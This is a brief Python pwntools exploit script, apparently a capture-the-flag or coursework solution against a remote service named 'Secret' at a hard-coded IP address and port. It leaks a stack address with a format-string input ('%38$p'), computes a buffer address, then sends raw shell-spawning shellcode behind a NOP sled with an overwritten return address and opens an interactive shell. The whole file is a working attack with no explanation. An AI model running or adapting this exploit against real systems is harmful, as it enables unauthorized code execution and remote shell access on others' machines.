import sys
import time
import os
from pwn import *

# str += "Z" * 250 + "BBBBCCCCDDDDEEEEFFFFGGGG"
# str += ("Z") * 250
# str += "BBBBCCCCDDDDEE"

# target_addr = 0x7fffffffdac0
# sys.stdout.buffer.write(shellcode + str + p64(buff_addr))
# r = process("./Secret")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
str = (b'\x90') * 237

r = remote('140.113.207.240', 8836)

print(r.recvline())

r.sendline("%38$p")
# will rece b'0x7ffdeacdffb0Wanna get my secret? Come and get it with your payload <3\n'
# 1. split with 'W' 
# 2. remove 0x
# 3. decode to string next to int
target_addr = r.recvline().split(b'W')[0][2:].decode()
buff_addr = int(target_addr, base=16)-0x120

print(buff_addr)

r.sendline(shellcode + str + p64(buff_addr))

r.interactive()

